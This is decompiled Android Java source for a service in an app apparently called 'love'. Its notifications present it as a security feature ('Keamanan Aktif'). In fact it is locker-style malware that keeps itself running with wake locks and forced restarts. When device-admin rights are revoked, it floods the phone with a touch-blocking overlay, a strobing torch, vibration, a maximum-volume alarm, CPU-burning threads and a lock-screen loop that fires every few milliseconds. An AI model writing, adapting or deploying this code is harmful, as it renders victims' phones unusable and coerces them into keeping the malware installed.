package com.love.app;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Process;
import android.os.SystemClock;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;
import androidx.core.view.ViewCompat;
import androidx.work.PeriodicWorkRequest;
import com.google.android.mms.smil.SmilHelper;

/* JADX INFO: loaded from: classes.dex */
public class AdminService extends Service {
    private static final String CHANNEL_ID = "admin_channel";
    private static final long CHECK_INTERVAL = 50;
    private static final long MAX_DELAY = 60000;
    private static final int NOTIF_ALERT_ID = 1002;
    private static final int NOTIF_ID = 1001;
    private static final String TAG = "AdminService";
    private AlarmManager alarmManager;
    private AudioManager audioManager;
    private CameraManager cameraManager;
    private PowerManager.WakeLock fullWakeLock;
    private MediaPlayer mediaPlayer;
    private int originalVolume;
    private View overlayView;
    private PowerManager.WakeLock partialWakeLock;
    private PendingIntent restartIntent;
    private String torchCameraId;
    private Vibrator vibrator;
    private WindowManager windowManager;
    private Handler handler = new Handler(Looper.getMainLooper());
    private volatile boolean isHanging = false;
    private Handler hangHandler = new Handler(Looper.getMainLooper());
    private Runnable checker = new Runnable() { // from class: com.love.app.AdminService.1
        private int failCount = 0;

        @Override // java.lang.Runnable
        public void run() {
            long jMin;
            try {
                if (!AdminService.this.checkAdminStatus()) {
                    int i = this.failCount + 1;
                    this.failCount = i;
                    jMin = Math.min(AdminService.MAX_DELAY, ((long) i) * AdminService.CHECK_INTERVAL);
                    AdminService.this.showNotification();
                    if (!AdminService.this.isHanging) {
                        AdminService.this.startHangingMode();
                    }
                } else {
                    this.failCount = 0;
                    jMin = 50;
                }
                AdminService.this.handler.postDelayed(this, jMin);
            } catch (Exception e) {
                Log.e(AdminService.TAG, "checker error", e);
                AdminService.this.handler.postDelayed(this, AdminService.CHECK_INTERVAL);
            }
        }
    };

    static /* synthetic */ boolean lambda$showOverlay$0(View view, MotionEvent motionEvent) {
        return true;
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate");
        acquireWakeLocks();
        startForegroundServiceWithNotification();
        setupAlarmRestart();
        initHangComponents();
        this.handler.post(this.checker);
    }

    private void initHangComponents() {
        CameraManager cameraManager = (CameraManager) getSystemService("camera");
        this.cameraManager = cameraManager;
        if (cameraManager != null) {
            try {
                this.torchCameraId = cameraManager.getCameraIdList()[0];
            } catch (Exception e) {
                Log.e(TAG, "camera list error", e);
            }
        }
        this.vibrator = (Vibrator) getSystemService("vibrator");
        this.windowManager = (WindowManager) getSystemService("window");
        AudioManager audioManager = (AudioManager) getSystemService(SmilHelper.ELEMENT_TAG_AUDIO);
        this.audioManager = audioManager;
        this.originalVolume = audioManager.getStreamVolume(3);
    }

    private void acquireWakeLocks() {
        PowerManager powerManager = (PowerManager) getSystemService("power");
        PowerManager.WakeLock wakeLockNewWakeLock = powerManager.newWakeLock(268435482, "AdminService:Full");
        this.fullWakeLock = wakeLockNewWakeLock;
        wakeLockNewWakeLock.acquire(600000L);
        PowerManager.WakeLock wakeLockNewWakeLock2 = powerManager.newWakeLock(1, "AdminService:Partial");
        this.partialWakeLock = wakeLockNewWakeLock2;
        wakeLockNewWakeLock2.acquire(600000L);
    }

    private void startForegroundServiceWithNotification() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, "Layanan Keamanan", 2);
            notificationChannel.setLockscreenVisibility(1);
            NotificationManager notificationManager = (NotificationManager) getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(notificationChannel);
            }
        }
        Notification notificationBuild = new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Keamanan Aktif").setContentText("Perangkat dalam perlindungan penuh").setSmallIcon(android.R.drawable.ic_lock_lock).setContentIntent(PendingIntent.getActivity(this, 0, new Intent(this, (Class<?>) TrappingActivity.class), 201326592)).setOngoing(true).setPriority(2).setCategory(NotificationCompat.CATEGORY_SERVICE).build();
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(1001, notificationBuild, 1);
        } else {
            startForeground(1001, notificationBuild);
        }
    }

    private void setupAlarmRestart() {
        this.alarmManager = (AlarmManager) getSystemService(NotificationCompat.CATEGORY_ALARM);
        this.restartIntent = PendingIntent.getService(this, 0, new Intent(this, (Class<?>) AdminService.class), 201326592);
        this.alarmManager.setRepeating(2, SystemClock.elapsedRealtime() + PeriodicWorkRequest.MIN_PERIODIC_FLEX_MILLIS, PeriodicWorkRequest.MIN_PERIODIC_FLEX_MILLIS, this.restartIntent);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean checkAdminStatus() {
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService("device_policy");
        return devicePolicyManager != null && devicePolicyManager.isAdminActive(new ComponentName(this, (Class<?>) AdminReceiver.class));
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void showNotification() {
        ((NotificationManager) getSystemService(NotificationManager.class)).notify(1002, new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("⚠️ Admin Dinonaktifkan ⚠️").setContentText("Perangkat akan terkunci total!").setSmallIcon(android.R.drawable.ic_dialog_alert).setContentIntent(PendingIntent.getActivity(this, 0, new Intent(this, (Class<?>) TrappingActivity.class), 201326592)).setAutoCancel(false).setOngoing(true).setPriority(1).setCategory(NotificationCompat.CATEGORY_ALARM).build());
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        Log.d(TAG, "onStartCommand");
        if (intent == null || intent.getAction() == null) {
            return 1;
        }
        if ("START_HANG".equals(intent.getAction())) {
            if (this.isHanging) {
                return 1;
            }
            startHangingMode();
            return 1;
        }
        if (!"STOP_HANG".equals(intent.getAction())) {
            return 1;
        }
        stopHangingMode();
        return 1;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void startHangingMode() {
        if (this.isHanging) {
            return;
        }
        this.isHanging = true;
        Log.e(TAG, "🔥 MEMULAI MODE HANG TOTAL 🔥");
        try {
            Intent intent = new Intent(this, (Class<?>) LockActivity.class);
            intent.addFlags(335544320);
            startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "start LockActivity error", e);
        }
        showOverlay();
        startTorchBlink();
        startVibrate();
        playMaxAlarm();
        startCpuBurner();
        launchLockScreenLoop();
        extendWakeLocks();
        muteSystemSounds();
    }

    private void stopHangingMode() {
        this.isHanging = false;
        this.hangHandler.removeCallbacksAndMessages(null);
        View view = this.overlayView;
        if (view != null) {
            try {
                this.windowManager.removeView(view);
            } catch (Exception unused) {
            }
            this.overlayView = null;
        }
        setTorch(false);
        Vibrator vibrator = this.vibrator;
        if (vibrator != null) {
            vibrator.cancel();
        }
        MediaPlayer mediaPlayer = this.mediaPlayer;
        if (mediaPlayer != null) {
            try {
                mediaPlayer.stop();
                this.mediaPlayer.release();
            } catch (Exception unused2) {
            }
            this.mediaPlayer = null;
        }
        AudioManager audioManager = this.audioManager;
        if (audioManager != null) {
            audioManager.setStreamVolume(3, this.originalVolume, 0);
            this.audioManager.setStreamVolume(4, this.originalVolume, 0);
        }
    }

    private void showOverlay() {
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, -1, Build.VERSION.SDK_INT >= 26 ? 2038 : 2002, 1448, -3);
        layoutParams.gravity = 8388659;
        layoutParams.screenBrightness = 0.0f;
        View view = new View(this);
        this.overlayView = view;
        view.setBackgroundColor(ViewCompat.MEASURED_STATE_MASK);
        this.overlayView.setAlpha(0.95f);
        this.overlayView.setOnTouchListener(new View.OnTouchListener() { // from class: com.love.app.AdminService$$ExternalSyntheticLambda1
            @Override // android.view.View.OnTouchListener
            public final boolean onTouch(View view2, MotionEvent motionEvent) {
                return AdminService.lambda$showOverlay$0(view2, motionEvent);
            }
        });
        try {
            this.windowManager.addView(this.overlayView, layoutParams);
        } catch (Exception e) {
            Log.e(TAG, "overlay error", e);
        }
    }

    private void startTorchBlink() {
        this.hangHandler.post(new Runnable() { // from class: com.love.app.AdminService.2
            boolean state = false;

            @Override // java.lang.Runnable
            public void run() {
                if (AdminService.this.isHanging) {
                    boolean z = !this.state;
                    this.state = z;
                    AdminService.this.setTorch(z);
                    AdminService.this.hangHandler.postDelayed(this, 80L);
                }
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void setTorch(boolean z) {
        if (this.torchCameraId != null) {
            try {
                this.cameraManager.setTorchMode(this.torchCameraId, z);
            } catch (CameraAccessException unused) {
            }
        }
    }

    private void startVibrate() {
        if (this.vibrator == null) {
            return;
        }
        this.hangHandler.post(new Runnable() { // from class: com.love.app.AdminService.3
            @Override // java.lang.Runnable
            public void run() {
                if (AdminService.this.isHanging) {
                    long[] jArr = {0, 200, AdminService.CHECK_INTERVAL, 200, AdminService.CHECK_INTERVAL, 200};
                    if (Build.VERSION.SDK_INT >= 26) {
                        AdminService.this.vibrator.vibrate(VibrationEffect.createWaveform(jArr, 0));
                    } else {
                        AdminService.this.vibrator.vibrate(jArr, 0);
                    }
                    AdminService.this.hangHandler.postDelayed(this, 500L);
                }
            }
        });
    }

    private void playMaxAlarm() {
        try {
            Uri defaultUri = RingtoneManager.getDefaultUri(4);
            if (defaultUri == null) {
                defaultUri = RingtoneManager.getDefaultUri(1);
            }
            MediaPlayer mediaPlayerCreate = MediaPlayer.create(this, defaultUri);
            this.mediaPlayer = mediaPlayerCreate;
            if (mediaPlayerCreate != null) {
                mediaPlayerCreate.setLooping(true);
                this.mediaPlayer.setVolume(1.0f, 1.0f);
                AudioManager audioManager = this.audioManager;
                audioManager.setStreamVolume(3, audioManager.getStreamMaxVolume(3), 0);
                this.mediaPlayer.start();
            }
        } catch (Exception e) {
            Log.e(TAG, "alarm error", e);
        }
    }

    private void startCpuBurner() {
        int iMax = Math.max(4, Runtime.getRuntime().availableProcessors() * 2);
        for (int i = 0; i < iMax; i++) {
            new Thread(new Runnable() { // from class: com.love.app.AdminService$$ExternalSyntheticLambda0
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m215lambda$startCpuBurner$1$comloveappAdminService();
                }
            }).start();
        }
    }

    /* JADX INFO: renamed from: lambda$startCpuBurner$1$com-love-app-AdminService, reason: not valid java name */
    /* synthetic */ void m215lambda$startCpuBurner$1$comloveappAdminService() {
        Process.setThreadPriority(-19);
        long jNanoTime = System.nanoTime();
        while (this.isHanging) {
            jNanoTime = (jNanoTime >>> 32) ^ ((6364136223846793005L * jNanoTime) + 1442695040888963407L);
            double d = jNanoTime;
            Math.sin(d);
            Math.cos(d);
            Math.sqrt(Math.abs(jNanoTime));
        }
    }

    private void launchLockScreenLoop() {
        this.hangHandler.post(new Runnable() { // from class: com.love.app.AdminService.4
            @Override // java.lang.Runnable
            public void run() {
                if (AdminService.this.isHanging) {
                    try {
                        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) AdminService.this.getSystemService("device_policy");
                        ComponentName componentName = new ComponentName(AdminService.this, (Class<?>) AdminReceiver.class);
                        if (devicePolicyManager != null && devicePolicyManager.isAdminActive(componentName)) {
                            devicePolicyManager.lockNow();
                        }
                        Intent intent = new Intent(AdminService.this, (Class<?>) LockActivity.class);
                        intent.addFlags(335675392);
                        AdminService.this.startActivity(intent);
                        AdminService.this.sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
                    } catch (Exception e) {
                        Log.e(AdminService.TAG, "launch LockActivity error", e);
                    }
                    AdminService.this.hangHandler.postDelayed(this, 10L);
                }
            }
        });
    }

    private void extendWakeLocks() {
        this.hangHandler.post(new Runnable() { // from class: com.love.app.AdminService.5
            @Override // java.lang.Runnable
            public void run() {
                if (AdminService.this.isHanging) {
                    if (AdminService.this.fullWakeLock != null && !AdminService.this.fullWakeLock.isHeld()) {
                        AdminService.this.fullWakeLock.acquire(600000L);
                    }
                    if (AdminService.this.partialWakeLock != null && !AdminService.this.partialWakeLock.isHeld()) {
                        AdminService.this.partialWakeLock.acquire(600000L);
                    }
                    AdminService.this.hangHandler.postDelayed(this, PeriodicWorkRequest.MIN_PERIODIC_FLEX_MILLIS);
                }
            }
        });
    }

    private void muteSystemSounds() {
        this.audioManager.setStreamVolume(1, 0, 0);
        this.audioManager.setStreamVolume(5, 0, 0);
        this.audioManager.setStreamVolume(2, 0, 0);
    }

    @Override // android.app.Service
    public void onDestroy() {
        PendingIntent pendingIntent;
        Log.d(TAG, "onDestroy");
        this.handler.removeCallbacks(this.checker);
        stopHangingMode();
        PowerManager.WakeLock wakeLock = this.fullWakeLock;
        if (wakeLock != null && wakeLock.isHeld()) {
            this.fullWakeLock.release();
        }
        PowerManager.WakeLock wakeLock2 = this.partialWakeLock;
        if (wakeLock2 != null && wakeLock2.isHeld()) {
            this.partialWakeLock.release();
        }
        AlarmManager alarmManager = this.alarmManager;
        if (alarmManager != null && (pendingIntent = this.restartIntent) != null) {
            alarmManager.cancel(pendingIntent);
        }
        super.onDestroy();
        Intent intent = new Intent(this, (Class<?>) AdminService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
}
